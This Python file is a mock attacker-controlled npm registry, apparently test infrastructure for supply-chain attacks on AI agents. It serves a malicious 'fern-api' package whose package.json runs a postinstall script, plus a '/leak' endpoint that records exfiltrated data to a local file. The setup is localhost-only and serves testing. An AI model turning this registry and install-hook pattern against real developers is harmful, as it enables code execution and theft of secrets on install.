"""Stand-in for an attacker-controlled npm registry + exfiltration collector.

Serves:
  GET /fern-api          -> packument for the malicious "fern-api" package
  GET /fern-api/1.0.0    -> version metadata (same content)
  GET /fern-api-1.0.0.tgz-> tarball with a postinstall script
  GET /leak              -> records exfiltrated data in /tmp/leaks.txt
"""
import hashlib
import http.server
import io
import os
import tarfile

HERE = os.path.dirname(os.path.abspath(__file__))
PORT = 8081
TARBALL = "/tmp/fern-api-1.0.0.tgz"
VERSION = "1.0.0"


def build_tarball():
    pkg = (
        '{"name":"fern-api","version":"' + VERSION + '",'
        '"bin":{"fern":"cli.js"},'
        '"scripts":{"postinstall":"node postinstall.js"}}'
    ).encode()
    with open(os.path.join(HERE, "postinstall.js"), "rb") as fh:
        post = fh.read()
    with open(os.path.join(HERE, "cli.js"), "rb") as fh:
        cli = fh.read()
    with tarfile.open(TARBALL, "w:gz") as tar:
        for name, data in (
            ("package/package.json", pkg),
            ("package/postinstall.js", post),
            ("package/cli.js", cli),
        ):
            info = tarfile.TarInfo(name)
            info.size = len(data)
            info.mode = 0o644
            tar.addfile(info, io.BytesIO(data))
    with open(TARBALL, "rb") as fh:
        return hashlib.sha1(fh.read()).hexdigest()


SHASUM = build_tarball()

METADATA = (
    '{"name":"fern-api","dist-tags":{"latest":"' + VERSION + '"},'
    '"versions":{"' + VERSION + '":{"name":"fern-api","version":"' + VERSION + '",'
    '"bin":{"fern":"cli.js"},'
    '"dist":{"tarball":"http://127.0.0.1:' + str(PORT) + '/fern-api-' + VERSION + '.tgz",'
    '"shasum":"' + SHASUM + '"}}}}'
).encode()


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        with open("/tmp/registry-requests.txt", "a") as fh:
            fh.write("%s %s\n" % (self.path, args))

    def _send(self, code, body=b"", ctype="application/json"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = self.path.split("?")[0]
        if path == "/-/ping":
            self._send(200, b"{}")
        elif path in ("/fern-api", "/fern-api/" + VERSION, "/fern-api?write=true"):
            self._send(200, METADATA)
        elif path == "/fern-api-" + VERSION + ".tgz":
            with open(TARBALL, "rb") as fh:
                self._send(200, fh.read(), "application/octet-stream")
        elif path == "/leak":
            with open("/tmp/leaks.txt", "a") as fh:
                fh.write("LEAK " + self.path + "\n")
            self._send(200, b"ok", "text/plain")
        else:
            self._send(404, b"{}")

    def do_POST(self):
        # npm audit/fund endpoints - answer empty so install does not fail.
        length = int(self.headers.get("Content-Length") or 0)
        if length:
            self.rfile.read(length)
        self._send(200, b"{}")


if __name__ == "__main__":
    http.server.ThreadingHTTPServer(("127.0.0.1", PORT), Handler).serve_forever()
